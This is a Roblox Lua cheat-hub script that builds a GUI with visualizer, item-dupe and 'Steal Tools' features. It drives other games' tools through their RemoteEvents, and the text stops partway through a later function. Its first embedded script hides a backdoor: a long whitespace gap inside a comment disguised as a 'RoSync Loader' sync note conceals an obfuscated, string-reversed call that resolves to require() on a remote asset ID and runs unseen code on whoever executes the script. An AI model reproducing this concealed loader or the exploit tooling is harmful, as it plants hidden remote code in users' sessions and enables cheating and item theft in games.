

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Hub = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextBox = Instance.new("TextButton")
local GamepassesFrame = Instance.new("Frame")
local TextLabel_4 = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local MAX = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local MAY = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local MAZ = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local WAX = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local WAY = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local WAZ = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local WavesOn = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local TextLabel_6 = Instance.new("TextLabel")
local TextLabel_7 = Instance.new("TextLabel")
local Distance = Instance.new("TextBox")
local WaveInt = Instance.new("TextBox")
local Speed = Instance.new("TextBox")
local Nothing = Instance.new("Frame")
local Nothing_2 = Instance.new("Frame")
local Nothing_3 = Instance.new("Frame")
local AudioId = Instance.new("TextBox")
local AboutUsFrame = Instance.new("Frame")
local TextLabel_8 = Instance.new("TextLabel")
local TextBox_2 = Instance.new("TextButton")
local Amount = Instance.new("TextBox")
local TextBox_3 = Instance.new("TextButton")
local TextLabel_9 = Instance.new("TextLabel")
local Nothing_4 = Instance.new("Frame")
local Nothing_5 = Instance.new("Frame")
local TextBox_4 = Instance.new("TextButton")
local Nothing_6 = Instance.new("Frame")
local Vis = Instance.new("TextButton")
local Other = Instance.new("TextButton")
local Settings = Instance.new("TextButton")
local Nothing_7 = Instance.new("Frame")
local Nothing_8 = Instance.new("Frame")
local Nothing_9 = Instance.new("Frame")
local PetsFrame = Instance.new("Frame")
local TextBox_5 = Instance.new("TextBox")
local Nothing_10 = Instance.new("Frame")
local TextBox_6 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = ScreenGui
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.509745479, 0, 0.519816756, 0)
Main.Size = UDim2.new(0, 405, 0, 361)
Main.Active = true
Main.Draggable = true

Hub.Name = "Hub"
Hub.Parent = Main
Hub.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
Hub.BorderSizePixel = 0
Hub.Size = UDim2.new(0, 405, 0, 35)

TextLabel.Parent = Hub
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.415930569, 0, 0.0857142881, 0)
TextLabel.Size = UDim2.new(0, 76, 0, 30)
TextLabel.Font = Enum.Font.Code
TextLabel.Text = "Homies"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 16.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_2.Parent = Hub
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.872506201, 0, 0.452380955, 0)
TextLabel_2.Size = UDim2.new(0, 49, 0, 19)
TextLabel_2.Font = Enum.Font.Code
TextLabel_2.Text = "Version 1"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 10.000
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_3.Parent = Hub
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.544726193, 0, 0.0857142881, 0)
TextLabel_3.Size = UDim2.new(0, 76, 0, 30)
TextLabel_3.Font = Enum.Font.Code
TextLabel_3.Text = "Hub"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 89, 89)
TextLabel_3.TextSize = 16.000
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

TextBox.Name = "TextBox"
TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TextBox.BorderColor3 = Color3.fromRGB(57, 57, 57)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.508707583, 0, 0.119113572, 0)
TextBox.Size = UDim2.new(0, 118, 0, 25)
TextBox.Font = Enum.Font.Code
TextBox.Text = "Visualize"
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000

GamepassesFrame.Name = "GamepassesFrame"
GamepassesFrame.Parent = Main
GamepassesFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
GamepassesFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
GamepassesFrame.BorderSizePixel = 0
GamepassesFrame.Position = UDim2.new(0.015590338, 0, 0.36873138, 0)
GamepassesFrame.Size = UDim2.new(0, 393, 0, 221)

TextLabel_4.Parent = GamepassesFrame
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.206396669, 0, 0.0764272809, 0)
TextLabel_4.Size = UDim2.new(0, 69, 0, 17)
TextLabel_4.Font = Enum.Font.Code
TextLabel_4.Text = "Main Angle"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 13.000

Frame.Parent = GamepassesFrame
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.15693447, 0, 0.265984625, 0)
Frame.Size = UDim2.new(0, 105, 0, 24)

MAX.Name = "MAX"
MAX.Parent = Frame
MAX.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
MAX.Position = UDim2.new(0.0093457941, 0, 0, 0)
MAX.Size = UDim2.new(0, 35, 0, 24)
MAX.Font = Enum.Font.Code
MAX.Text = "X"
MAX.TextColor3 = Color3.fromRGB(53, 53, 53)
MAX.TextSize = 14.000

UICorner.CornerRadius = UDim.new(0, 3)
UICorner.Parent = MAX

MAY.Name = "MAY"
MAY.Parent = Frame
MAY.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
MAY.Position = UDim2.new(0.339622617, 0, 0, 0)
MAY.Size = UDim2.new(0, 35, 0, 24)
MAY.Font = Enum.Font.Code
MAY.Text = "Y"
MAY.TextColor3 = Color3.fromRGB(53, 53, 53)
MAY.TextSize = 14.000

UICorner_2.CornerRadius = UDim.new(0, 3)
UICorner_2.Parent = MAY

MAZ.Name = "MAZ"
MAZ.Parent = Frame
MAZ.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
MAZ.Position = UDim2.new(0.660730004, 0, 0, 0)
MAZ.Size = UDim2.new(0, 35, 0, 24)
MAZ.Font = Enum.Font.Code
MAZ.Text = "Z"
MAZ.TextColor3 = Color3.fromRGB(53, 53, 53)
MAZ.TextSize = 14.000

UICorner_3.CornerRadius = UDim.new(0, 3)
UICorner_3.Parent = MAZ

Frame_2.Parent = GamepassesFrame
Frame_2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.159134641, 0, 0.737665176, 0)
Frame_2.Size = UDim2.new(0, 104, 0, 24)

WAX.Name = "WAX"
WAX.Parent = Frame_2
WAX.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
WAX.Position = UDim2.new(0.0093457941, 0, 0, 0)
WAX.Size = UDim2.new(0, 35, 0, 24)
WAX.Font = Enum.Font.Code
WAX.Text = "X"
WAX.TextColor3 = Color3.fromRGB(53, 53, 53)
WAX.TextSize = 14.000

UICorner_4.CornerRadius = UDim.new(0, 3)
UICorner_4.Parent = WAX

WAY.Name = "WAY"
WAY.Parent = Frame_2
WAY.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
WAY.Position = UDim2.new(0.339622617, 0, 0, 0)
WAY.Size = UDim2.new(0, 35, 0, 24)
WAY.Font = Enum.Font.Code
WAY.Text = "Y"
WAY.TextColor3 = Color3.fromRGB(53, 53, 53)
WAY.TextSize = 14.000

UICorner_5.CornerRadius = UDim.new(0, 3)
UICorner_5.Parent = WAY

WAZ.Name = "WAZ"
WAZ.Parent = Frame_2
WAZ.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
WAZ.Position = UDim2.new(0.660730004, 0, 0, 0)
WAZ.Size = UDim2.new(0, 35, 0, 24)
WAZ.Font = Enum.Font.Code
WAZ.Text = "Z"
WAZ.TextColor3 = Color3.fromRGB(53, 53, 53)
WAZ.TextSize = 14.000

UICorner_6.CornerRadius = UDim.new(0, 3)
UICorner_6.Parent = WAZ

WavesOn.Name = "WavesOn"
WavesOn.Parent = Frame_2
WavesOn.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
WavesOn.Position = UDim2.new(0.814416647, 0, -1.17032111, 0)
WavesOn.Size = UDim2.new(0, 18, 0, 18)
WavesOn.Font = Enum.Font.Code
WavesOn.Text = ""
WavesOn.TextColor3 = Color3.fromRGB(53, 53, 53)
WavesOn.TextSize = 14.000

UICorner_7.CornerRadius = UDim.new(0, 3)
UICorner_7.Parent = WavesOn

TextLabel_5.Parent = GamepassesFrame
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.206990704, 0, 0.441554725, 0)
TextLabel_5.Size = UDim2.new(0, 69, 0, 17)
TextLabel_5.Font = Enum.Font.Code
TextLabel_5.Text = "Waves"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextSize = 14.000

TextLabel_6.Parent = GamepassesFrame
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Position = UDim2.new(0.1962993, 0, 0.605312169, 0)
TextLabel_6.Size = UDim2.new(0, 48, 0, 16)
TextLabel_6.Font = Enum.Font.Code
TextLabel_6.Text = "Enabled"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextSize = 12.000

TextLabel_7.Parent = GamepassesFrame
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.Position = UDim2.new(0.597258508, 0, 0.109000087, 0)
TextLabel_7.Size = UDim2.new(0, 69, 0, 19)
TextLabel_7.Font = Enum.Font.Code
TextLabel_7.Text = "Misc"
TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.TextSize = 13.000

Distance.Name = "Distance"
Distance.Parent = GamepassesFrame
Distance.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Distance.BorderColor3 = Color3.fromRGB(54, 54, 54)
Distance.BorderSizePixel = 0
Distance.Position = UDim2.new(0.535075188, 0, 0.285386354, 0)
Distance.Size = UDim2.new(0, 118, 0, 28)
Distance.Font = Enum.Font.Code
Distance.PlaceholderText = "Distance"
Distance.Text = ""
Distance.TextColor3 = Color3.fromRGB(255, 255, 255)
Distance.TextSize = 14.000

WaveInt.Name = "WaveInt"
WaveInt.Parent = GamepassesFrame
WaveInt.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
WaveInt.BorderColor3 = Color3.fromRGB(54, 54, 54)
WaveInt.BorderSizePixel = 0
WaveInt.Position = UDim2.new(0.534695566, 0, 0.503207445, 0)
WaveInt.Size = UDim2.new(0, 118, 0, 28)
WaveInt.Font = Enum.Font.Code
WaveInt.PlaceholderText = "Wave Intensity"
WaveInt.Text = ""
WaveInt.TextColor3 = Color3.fromRGB(255, 255, 255)
WaveInt.TextSize = 12.000

Speed.Name = "Speed"
Speed.Parent = GamepassesFrame
Speed.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Speed.BorderColor3 = Color3.fromRGB(54, 54, 54)
Speed.BorderSizePixel = 0
Speed.Position = UDim2.new(0.53667891, 0, 0.726120949, 0)
Speed.Size = UDim2.new(0, 118, 0, 28)
Speed.Font = Enum.Font.Code
Speed.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
Speed.PlaceholderText = "Speed"
Speed.Text = ""
Speed.TextColor3 = Color3.fromRGB(255, 255, 255)
Speed.TextSize = 14.000

Nothing.Name = "Nothing"
Nothing.Parent = GamepassesFrame
Nothing.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
Nothing.BorderColor3 = Color3.fromRGB(20, 20, 20)
Nothing.BorderSizePixel = 0
Nothing.Position = UDim2.new(0.595627189, 0, 0.208552435, 0)
Nothing.Size = UDim2.new(0, 69, 0, 2)

Nothing_2.Name = "Nothing"
Nothing_2.Parent = GamepassesFrame
Nothing_2.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
Nothing_2.BorderColor3 = Color3.fromRGB(20, 20, 20)
Nothing_2.BorderSizePixel = 0
Nothing_2.Position = UDim2.new(0.169241473, 0, 0.185187936, 0)
Nothing_2.Size = UDim2.new(0, 96, 0, 2)

Nothing_3.Name = "Nothing"
Nothing_3.Parent = GamepassesFrame
Nothing_3.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
Nothing_3.BorderColor3 = Color3.fromRGB(20, 20, 20)
Nothing_3.BorderSizePixel = 0
Nothing_3.Position = UDim2.new(0.169241473, 0, 0.54500097, 0)
Nothing_3.Size = UDim2.new(0, 96, 0, 2)

AudioId.Name = "AudioId"
AudioId.Parent = Main
AudioId.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
AudioId.BorderColor3 = Color3.fromRGB(57, 57, 57)
AudioId.BorderSizePixel = 0
AudioId.Position = UDim2.new(0.207046926, 0, 0.119113572, 0)
AudioId.Size = UDim2.new(0, 113, 0, 25)
AudioId.Font = Enum.Font.Code
AudioId.PlaceholderText = "Audio-ID"
AudioId.Text = ""
AudioId.TextColor3 = Color3.fromRGB(255, 255, 255)
AudioId.TextSize = 14.000

AboutUsFrame.Name = "AboutUsFrame"
AboutUsFrame.Parent = Main
AboutUsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
AboutUsFrame.BorderSizePixel = 0
AboutUsFrame.Position = UDim2.new(0.0148148146, 0, 0.36873138, 0)
AboutUsFrame.Size = UDim2.new(0, 393, 0, 221)
AboutUsFrame.Visible = false

TextLabel_8.Parent = AboutUsFrame
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.Position = UDim2.new(0.41659686, 0, 0.436563611, 0)
TextLabel_8.Size = UDim2.new(0, 69, 0, 13)
TextLabel_8.Font = Enum.Font.Code
TextLabel_8.Text = "Misc"
TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.TextSize = 13.000

TextBox_2.Name = "TextBox"
TextBox_2.Parent = AboutUsFrame
TextBox_2.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
TextBox_2.BorderColor3 = Color3.fromRGB(57, 57, 57)
TextBox_2.BorderSizePixel = 0
TextBox_2.Position = UDim2.new(0.350093782, 0, 0.616245091, 0)
TextBox_2.Size = UDim2.new(0, 118, 0, 26)
TextBox_2.Font = Enum.Font.Code
TextBox_2.Text = "Sync"
TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.TextSize = 14.000

Amount.Name = "Amount"
Amount.Parent = AboutUsFrame
Amount.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Amount.BorderColor3 = Color3.fromRGB(57, 57, 57)
Amount.BorderSizePixel = 0
Amount.Position = UDim2.new(0.198245108, 0, 0.264264375, 0)
Amount.Size = UDim2.new(0, 113, 0, 26)
Amount.Font = Enum.Font.Code
Amount.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
Amount.PlaceholderText = "Amount"
Amount.Text = ""
Amount.TextColor3 = Color3.fromRGB(255, 255, 255)
Amount.TextSize = 14.000

TextBox_3.Name = "TextBox"
TextBox_3.Parent = AboutUsFrame
TextBox_3.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
TextBox_3.BorderColor3 = Color3.fromRGB(57, 57, 57)
TextBox_3.BorderSizePixel = 0
TextBox_3.Position = UDim2.new(0.509336948, 0, 0.264264375, 0)
TextBox_3.Size = UDim2.new(0, 118, 0, 26)
TextBox_3.Font = Enum.Font.Code
TextBox_3.Text = "Dupe Amount"
TextBox_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_3.TextSize = 14.000

TextLabel_9.Parent = AboutUsFrame
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.Position = UDim2.new(0.414052248, 0, 0.0659567565, 0)
TextLabel_9.Size = UDim2.new(0, 69, 0, 16)
TextLabel_9.Font = Enum.Font.Code
TextLabel_9.Text = "Dupe"
TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.TextSize = 13.000

Nothing_4.Name = "Nothing"
Nothing_4.Parent = AboutUsFrame
Nothing_4.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
Nothing_4.BorderColor3 = Color3.fromRGB(20, 20, 20)
Nothing_4.BorderSizePixel = 0
Nothing_4.Position = UDim2.new(0.4149656, 0, 0.173564449, 0)
Nothing_4.Size = UDim2.new(0, 69, 0, 2)

Nothing_5.Name = "Nothing"
Nothing_5.Parent = AboutUsFrame
Nothing_5.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
Nothing_5.BorderColor3 = Color3.fromRGB(20, 20, 20)
Nothing_5.BorderSizePixel = 0
Nothing_5.Position = UDim2.new(0.412421077, 0, 0.52985847, 0)
Nothing_5.Size = UDim2.new(0, 69, 0, 2)

TextBox_4.Name = "TextBox"
TextBox_4.Parent = AboutUsFrame
TextBox_4.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
TextBox_4.BorderColor3 = Color3.fromRGB(54, 54, 54)
TextBox_4.BorderSizePixel = 0
TextBox_4.Position = UDim2.new(0.350093752, 0, 0.800891519, 0)
TextBox_4.Size = UDim2.new(0, 119, 0, 26)
TextBox_4.Font = Enum.Font.Code
TextBox_4.Text = "Steal Tools"
TextBox_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_4.TextSize = 14.000

Nothing_6.Name = "Nothing"
Nothing_6.Parent = Main
Nothing_6.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
Nothing_6.BorderColor3 = Color3.fromRGB(20, 20, 20)
Nothing_6.BorderSizePixel = 0
Nothing_6.Position = UDim2.new(0, 0, 0.262677938, 0)
Nothing_6.Size = UDim2.new(0, 405, 0, 2)
Nothing_6.Visible = false

Vis.Name = "Vis"
Vis.Parent = Main
Vis.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Vis.BorderSizePixel = 0
Vis.Position = UDim2.new(0.0493827164, 0, 0.289102972, 0)
Vis.Size = UDim2.new(0, 114, 0, 26)
Vis.Font = Enum.Font.Code
Vis.Text = "Visualizer"
Vis.TextColor3 = Color3.fromRGB(255, 255, 255)
Vis.TextSize = 15.000

Other.Name = "Other"
Other.Parent = Main
Other.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Other.BorderSizePixel = 0
Other.Position = UDim2.new(0.666666687, 0, 0.289102972, 0)
Other.Size = UDim2.new(0, 114, 0, 26)
Other.Font = Enum.Font.Code
Other.Text = "Other"
Other.TextColor3 = Color3.fromRGB(255, 255, 255)
Other.TextSize = 15.000

Settings.Name = "Settings"
Settings.Parent = Main
Settings.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(0.355621099, 0, 0.289102972, 0)
Settings.Size = UDim2.new(0, 117, 0, 26)
Settings.Font = Enum.Font.Code
Settings.Text = "Tools"
Settings.TextColor3 = Color3.fromRGB(255, 255, 255)
Settings.TextSize = 15.000

Nothing_7.Name = "Nothing"
Nothing_7.Parent = Main
Nothing_7.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
Nothing_7.BorderColor3 = Color3.fromRGB(20, 20, 20)
Nothing_7.BorderSizePixel = 0
Nothing_7.Position = UDim2.new(0.666666687, 0, 0.362796634, 0)
Nothing_7.Size = UDim2.new(0, 114, 0, 2)

Nothing_8.Name = "Nothing"
Nothing_8.Parent = Main
Nothing_8.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
Nothing_8.BorderColor3 = Color3.fromRGB(20, 20, 20)
Nothing_8.BorderSizePixel = 0
Nothing_8.Position = UDim2.new(0.355621099, 0, 0.363017082, 0)
Nothing_8.Size = UDim2.new(0, 117, 0, 2)

Nothing_9.Name = "Nothing"
Nothing_9.Parent = Main
Nothing_9.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
Nothing_9.BorderColor3 = Color3.fromRGB(20, 20, 20)
Nothing_9.BorderSizePixel = 0
Nothing_9.Position = UDim2.new(0.0493825637, 0, 0.363017052, 0)
Nothing_9.Size = UDim2.new(0, 114, 0, 2)

PetsFrame.Name = "PetsFrame"
PetsFrame.Parent = Main
PetsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
PetsFrame.BorderSizePixel = 0
PetsFrame.Position = UDim2.new(0.0148148146, 0, 0.36873138, 0)
PetsFrame.Size = UDim2.new(0, 393, 0, 221)
PetsFrame.Visible = false

TextBox_5.Parent = PetsFrame
TextBox_5.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
TextBox_5.BorderSizePixel = 0
TextBox_5.Position = UDim2.new(0.351145029, 0, 0.369158864, 0)
TextBox_5.Size = UDim2.new(0, 117, 0, 29)
TextBox_5.Font = Enum.Font.Code
TextBox_5.Text = "Coming soon!"
TextBox_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_5.TextSize = 14.000

Nothing_10.Name = "Nothing"
Nothing_10.Parent = PetsFrame
Nothing_10.BackgroundColor3 = Color3.fromRGB(255, 89, 89)
Nothing_10.BorderColor3 = Color3.fromRGB(20, 20, 20)
Nothing_10.BorderSizePixel = 0
Nothing_10.Position = UDim2.new(0.350532055, 0, 0.493858218, 0)
Nothing_10.Size = UDim2.new(0, 117, 0, 2)

TextBox_6.Name = "TextBox"
TextBox_6.Parent = Main
TextBox_6.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TextBox_6.BorderColor3 = Color3.fromRGB(57, 57, 57)
TextBox_6.BorderSizePixel = 0
TextBox_6.Position = UDim2.new(0.355894953, 0, 0.208700255, 0)
TextBox_6.Size = UDim2.new(0, 116, 0, 25)
TextBox_6.Font = Enum.Font.Code
TextBox_6.Text = "Mass-Play"
TextBox_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_6.TextSize = 14.000

-- Scripts:

local function NOANNM_fake_script() -- TextLabel. 
	local script = Instance.new('Script', TextLabel)

	
	--[[ Last synced 5/22/2021 10:19                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5724277547) --[[                                                                                                  ]]--
end
coroutine.wrap(NOANNM_fake_script)()
local function YLNTT_fake_script() -- TextBox.LocalScript 
	local script = Instance.new('LocalScript', TextBox)

	local currentid=""
	local currentconnection=nil
	local vis = nil
	local dt =0
	local CurrentSound=nil
	local CurrentTimePosition=0
	game:service'RunService'.Stepped:Connect(function(e,d)
		dt+=d
	end)
	local dont=1
	function setupadded()
		game.Players.LocalPlayer.Character.ChildAdded:Connect(function(child)
			if child:IsA("Tool") and dont ==0 then
				wait()
				child.Parent=game.Players.LocalPlayer.Backpack
				wait(.3)
				dont=1
				if vis ~=nil then
					vis(currentid,CurrentTimePosition)
				end
			end
		end)
	end
	setupadded()
	vis=function(id,timepos)
		_G.tov={}
		if _G.NetFix==nil then
			_G.NetFix=" "
			game:service'RunService'.Heartbeat:Connect(function()
				for i,v in pairs(_G.tov) do
					v[1].Velocity=Vector3.new(2e2,0,0)
					v[1].CFrame=v[2].CFrame
				end
			end)
		end
		local Stopped=false
		local visstuff={}
		local function align(i)
			l=Instance.new("Part")
			l.Transparency=1
			l.Parent=i.Parent
			l.Size=Vector3.new(0,0,0)
			l.Name=""
			l.CanCollide=false
			l.Anchored=true
			l.CFrame=i.CFrame
			table.insert(_G.tov,{i,l})
			local att0 = Instance.new("Attachment", i)
			att0.Position = Vector3.new(0,0,0)
			local att1 = Instance.new("Attachment", l)
			att1.Position = Vector3.new(0,0,0)
			local AP = Instance.new("AlignPosition", i)
			AP.Attachment0 = att0
			AP.Attachment1 = att1
			AP.RigidityEnabled = true
			AP.ReactionForceEnabled = false
			AP.ApplyAtCenterOfMass = true
			AP.MaxForce = 9999999
			AP.MaxVelocity = math.huge
			AP.Responsiveness = 200
			local AO = Instance.new("AlignOrientation", i)
			AO.Attachment0 = att0
			AO.Attachment1 = att1
			AO.ReactionTorqueEnabled = false
			AO.PrimaryAxisOnly = false
			AO.MaxTorque = 9999999
			AO.MaxAngularVelocity = math.huge
			AO.Responsiveness = 200
			table.insert(visstuff,{AO,AP,att0,att1,l})
			return l
		end
		local Visualizer={}
		local First=false
		local Handles={}
		local ToolCount=0
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			if v:IsA("Tool") then
				ToolCount=ToolCount+1
			end
		end
		local cf=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			if v:IsA("Tool") then
				coroutine.wrap(function()
					if First==false then
						First=v
					end
					local Handle=v:FindFirstChildOfClass("Part")
					v.Parent=game.Players.LocalPlayer.Character
					if Handle:FindFirstChildOfClass("Sound") then
						Handle:FindFirstChildOfClass("Sound").Parent=Instance.new("Part")
					end
					currentid=id
					v:FindFirstChildOfClass("RemoteEvent"):FireServer("PlaySong",(id))
					repeat wait() until Handle:FindFirstChildOfClass("Sound") and Handle:FindFirstChildOfClass("Sound").IsPlaying
					for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
						if v.Name=="RightGrip" then
							v:Destroy()
						end
					end
					Handle.Name=""
					if First==v then
						CurrentSound=Handle:FindFirstChildOfClass("Sound")
					end
					Handle:FindFirstChildOfClass("Sound").Playing=false
					coroutine.wrap(function()
						repeat wait() until v.Parent~=game.Players.LocalPlayer.Character
						Handle.Name="Handle"
						Stopped=true
						dont=1
						_G.tov={}
						for i,v in pairs(visstuff) do
							for i,v in pairs(v) do
								v:Destroy()
							end
						end
					end)()
					table.insert(Handles,Handle)
					table.insert(Visualizer,align(Handle))
				end)()
			end
		end
		local Root=game.Players.LocalPlayer.Character.HumanoidRootPart
		repeat wait() until #Visualizer==ToolCount and CurrentSound
		wait(1)
		for i,v in pairs(Handles) do
			coroutine.wrap(function()
				v:FindFirstChildOfClass("Sound").TimePosition=timepos
				v:FindFirstChildOfClass("Sound").Playing=true
			end)()
		end
		spawn(function()
			while wait(.6) do
				if Stopped == true then
					break
				end
				if CurrentSound.IsPlaying == true then
					CurrentTimePosition=CurrentSound.TimePosition
				end
			end
		end)
		local RenderStepped = game:GetService('RunService').RenderStepped
		local Wait = RenderStepped.Wait
		local Selected=CurrentSound
		local p = Instance.new("Part")
		function CF2V(cf)
			p.CFrame=cf
			return p.Rotation
		end
		local function AngleFromSettings(angle,str)
			if str=="X" then
				return CFrame.Angles(angle,0,0)
			elseif str=="Y" then
				return CFrame.Angles(0,angle,0)
			elseif str=="Z" then
				return CFrame.Angles(0,0,angle)
			end
		end
		local function VectorFromSettings(angle,str)
			if str=="X" then
				return Vector3.new(angle,0,0)
			elseif str=="Y" then
				return Vector3.new(0,angle,0)
			elseif str=="Z" then
				return Vector3.new(0,0,angle)
			end
		end
		dont=0
		setupadded()
		for K,V in next, Visualizer do
			coroutine.wrap(function()
				repeat
					local Spin = 0
					repeat
						if CurrentSound then
							local Volume = CurrentSound['PlaybackLoudness']
							local Iterator=math.rad(Spin+(K*(360/#Visualizer)))
							local Z = _G.Distance + Volume / (1 ~= 100 and (100 - 1) or .01)
							local G =  Volume / (35 ~= 100 and (100 - 35) or .01)
							local P = CFrame.new(Root['Position']) * AngleFromSettings(Iterator,_G.VisAngle) * CFrame.new(0,0,Z)
							local AddVector =Vector3.new(0,0,0)
							if _G.WavesOn == "On" then
								AddVector=VectorFromSettings(math.sin((((dt*_G.WaveInt)+(K/#Visualizer)*(math.pi*2)))),_G.WavesAngle)
							end
							V['Position'] = P.p+AddVector
							V['Rotation'] = CF2V(CFrame.new(V.Position, Root['Position'] + Vector3.new(0, G, 0)))
						end
						Spin+=_G.Speed
						game:service'RunService'.RenderStepped:Wait()
					until Stopped or ((Spin >= 360)) 
				until Stopped
				ccc:Disconnect()
			end)()
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		vis(script.Parent.Parent.AudioId.Text:gsub("%D+", ""),0)
	end)
end
coroutine.wrap(YLNTT_fake_script)()
local function SNNOC_fake_script() -- MAX.LocalScript 
	local script = Instance.new('LocalScript', MAX)

